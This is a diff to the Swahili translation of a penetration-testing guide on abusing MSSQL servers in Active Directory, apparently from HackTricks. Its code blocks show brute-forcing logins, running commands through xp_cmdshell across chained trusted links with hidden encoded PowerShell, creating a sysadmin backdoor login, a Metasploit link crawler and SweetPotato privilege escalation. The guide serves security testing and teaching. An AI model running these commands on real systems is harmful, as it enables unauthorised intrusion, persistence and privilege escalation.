@@ -3,11 +3,11 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **MSSQL Uainishaji / Ugunduzi**
+## **MSSQL Enumeration / Ugunduzi**
 
 ### Python
 
-Chombo cha [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) kinategemea impacket, na pia kinaruhusu kuingia kwa kutumia tiketi za kerberos, na kushambulia kupitia minyororo ya viungo.
+Zana ya [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) imejengwa kwa msingi wa impacket, na pia inaruhusu kufanya authentication kwa kutumia kerberos tickets, na ku-attack kupitia link chains
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### Kuorodhesha kutoka kwenye mtandao bila kikao cha kikoa
+### Enumerating kutoka kwenye network bila domain session
 ```
 
 # Interactive mode
@@ -90,11 +90,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Moduli ya powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ni muhimu sana katika kesi hii.
+Moduli ya Powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ni muhimu sana katika hali hii.
 ```bash
 Import-Module .\PowerupSQL.psd1
 ````
-### Kuorodhesha kutoka kwenye mtandao bila kikao cha kikoa
+### Kuorodhesha kutoka kwenye mtandao bila session ya domain
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -108,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Kuorodhesha kutoka ndani ya eneo
+### Kukusanya taarifa ukiwa ndani ya domain
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -133,9 +133,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Basic Abuse
+## Unyanyasaji wa Msingi wa MSSQL
 
-### Access DB
+### Kufikia DB
 ```bash
 # List databases
 Get-SQLInstanceDomain | Get-SQLDatabase
@@ -161,12 +161,12 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Inaweza pia kuwa inawezekana **kutekeleza amri** ndani ya mwenyeji wa MSSQL
+Huenda pia ikawezekana **kutekeleza amri** ndani ya host ya MSSQL
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in the page mentioned in the **following section how to do this manually.**
+Angalia katika ukurasa uliotajwa kwenye **sehemu ifuatayo jinsi ya kufanya hivi manually.**
 
 ### MSSQL Basic Hacking Tricks
 
@@ -177,9 +177,9 @@ Check in the page mentioned in the **following section how to do this manually.*
 
 ## MSSQL Trusted Links
 
-Ikiwa mfano wa MSSQL unaminiwa (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyoaminiwa, ataweza **kutumia uhusiano wa kuaminiana kutekeleza maswali pia katika mfano mwingine**. Hii inategemea inaweza kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database iliyo na mipangilio isiyo sahihi ambapo anaweza kutekeleza amri.
+Ikiwa MSSQL instance inaaminiwa (database link) na MSSQL instance nyingine. Ikiwa mtumiaji ana privileges kwenye database inayoaminiwa, ataweza **kutumia trust relationship kutekeleza queries pia kwenye instance nyingine**. Trust hizi zinaweza kuunganishwa, na wakati fulani mtumiaji anaweza kupata database iliyowekwa vibaya ambapo anaweza kutekeleza commands.
 
-**Viungo kati ya databases vinafanya kazi hata katika uaminifu wa msitu.**
+**Links kati ya databases hufanya kazi hata kupitia forest trusts.**
 
 ### Powershell Abuse
 ```bash
@@ -213,7 +213,7 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-Zana nyingine inayofanana ambayo inaweza kutumika ni [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+Chombo kingine kama hicho ambacho kinaweza kutumika ni [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
 ```bash
 SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
 # Cobalt Strike
@@ -221,43 +221,43 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-Unaweza kwa urahisi kuangalia viungo vinavyotegemewa kwa kutumia metasploit.
+Unaweza kuangalia kwa urahisi trusted links kwa kutumia metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Kumbuka kwamba metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (hivyo, ikiwa huwezi kutekeleza amri na `openquery()` utahitaji kujaribu njia ya `EXECUTE` **kwa mikono** kutekeleza amri, angalia zaidi hapa chini.)
+Kumbuka kwamba metasploit itajaribu kutumia tu function ya `openquery()` katika MSSQL (kwa hiyo, ikiwa huwezi kutekeleza command kwa kutumia `openquery()` utahitaji kujaribu method ya `EXECUTE` **manually** ili kutekeleza commands, tazama zaidi hapa chini.)
 
-### Mikono - Openquery()
+### Manual - Openquery()
 
-Kutoka **Linux** unaweza kupata shell ya MSSQL console kwa kutumia **sqsh** na **mssqlclient.py.**
+Kutoka **Linux** unaweza kupata MSSQL console shell kwa kutumia **sqsh** na **mssqlclient.py.**
 
-Kutoka **Windows** unaweza pia kupata viungo na kutekeleza amri kwa mikono ukitumia **MSSQL client kama** [**HeidiSQL**](https://www.heidisql.com)
+Kutoka **Windows** unaweza pia kupata links na kutekeleza commands manually kwa kutumia **MSSQL client kama** [**HeidiSQL**](https://www.heidisql.com)
 
-_Ingia kwa kutumia uthibitisho wa Windows:_
+_Kuingia kwa kutumia Windows authentication:_
 
-![](<../../images/image (808).png>)
+![Metasploit - Manual - Openquery(): Kuingia kwa kutumia Windows authentication](<../../images/image (808).png>)
 
-#### Pata Viungo vya Kuaminika
+#### Tafuta Links Zinazoaminika
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../images/image (716).png>)
+![Mwongozo - Openquery() - Tafuta Links za kuaminika: EXEC sp linkedservers;](<../../images/image (716).png>)
 
-#### Teua maswali katika kiungo kinachoweza kuaminika
+#### Tekeleza queries kwenye link ya kuaminika
 
-Teua maswali kupitia kiungo (mfano: pata viungo zaidi katika mfano mpya unaopatikana):
+Tekeleza queries kupitia link (mfano: tafuta links zaidi kwenye instance mpya inayoweza kufikiwa):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Angalia mahali ambapo nukuu mbili na moja zinatumika, ni muhimu kuzitumia hivyo.
+> Angalia mahali ambapo nukuu mbili na nukuu moja zimetumika; ni muhimu kuzitumia kwa njia hiyo.
 
-![](<../../images/image (643).png>)
+![Tafuta Viungo Vinavyoaminika - Tekeleza queries katika kiungo kinachoaminika: Angalia mahali ambapo nukuu mbili na nukuu moja zimetumika; ni muhimu kuzitumia kwa njia hiyo](<../../images/image (643).png>)
 
-Unaweza kuendelea na mnyororo huu wa viungo vilivyoaminika milele kwa mikono.
+Unaweza kuendelea na mnyororo huu wa viungo vinavyoaminika bila kikomo kwa mikono.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -265,11 +265,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Ikiwa huwezi kufanya vitendo kama `exec xp_cmdshell` kutoka `openquery()`, jaribu kutumia njia ya `EXECUTE`.
+Ikiwa huwezi kutekeleza vitendo kama `exec xp_cmdshell` kutoka kwa `openquery()`, jaribu kutumia mbinu ya `EXECUTE`.
 
-### Manual - EXECUTE
+### Mwongozo - EXECUTE
 
-Unaweza pia kutumia viungo vya kuaminika kwa kutumia `EXECUTE`:
+Unaweza pia kutumia vibaya trusted links ukitumia `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -277,16 +277,16 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Local Privilege Escalation
 
-Mkasisi wa **MSSQL local user** kwa kawaida ana aina maalum ya ruhusa inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
+**MSSQL local user** kwa kawaida huwa na aina maalum ya privilege inayoitwa **`SeImpersonatePrivilege`**. Hii huruhusu akaunti "kuiga client baada ya authentication".
 
-Mkakati ambao waandishi wengi wamekuja nao ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya uasi au mtu katikati ambayo mshambuliaji anaunda. Huduma hii ya uasi inaweza kujifanya kama huduma ya SYSTEM wakati inajaribu kuthibitisha.
+Mkakati ambao waandishi wengi wamebuni ni kulazimisha service ya SYSTEM kufanya authentication kwenye service ya rogue au man-in-the-middle inayoundwa na attacker. Service hii ya rogue inaweza kisha kuiga service ya SYSTEM wakati inapojaribu kufanya authentication.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) ina mkusanyiko wa mbinu hizi mbalimbali ambazo zinaweza kutekelezwa kupitia amri ya `execute-assembly` ya Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) ina mkusanyiko wa mbinu hizi mbalimbali ambazo zinaweza kutekelezwa kupitia command ya Beacon `execute-assembly`.
 
 
 
 ### SCCM Management Point NTLM Relay (OSD Secret Extraction)
-Tazama jinsi majukumu ya kawaida ya SQL ya SCCM **Management Points** yanavyoweza kutumika vibaya ili kutoa Akaunti ya Upataji wa Mtandao na siri za Mfululizo wa Kazi moja kwa moja kutoka kwenye hifadhidata ya tovuti:
+Angalia jinsi SQL roles za kawaida za SCCM **Management Points** zinavyoweza kutumiwa vibaya kudump Network Access Account na secrets za Task-Sequence moja kwa moja kutoka kwenye site database:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
